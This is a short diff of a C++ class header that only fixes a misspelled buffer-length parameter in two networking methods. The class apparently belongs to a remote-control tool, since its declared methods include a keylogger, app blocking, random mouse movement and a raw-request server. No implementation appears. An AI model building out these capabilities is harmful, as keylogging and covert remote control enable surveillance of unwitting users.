@@ -52,9 +52,9 @@ public:
 	void OpenApp(const char* app);
 	void BlockApps();
 	void UnBlockApps();
-	int StartServer(const char* port, int bufferLenght = 512);
+	int StartServer(const char* port, int bufferlength = 512);
 	const char* RawRequest(const char * serverAddress, const char* port,
-			const char* request, int bufferLenght = 512);
+			const char* request, int bufferlength = 512);
 	void Hibernation();
 	void RandMouse();
 	void Keylogger(const char* fileName);
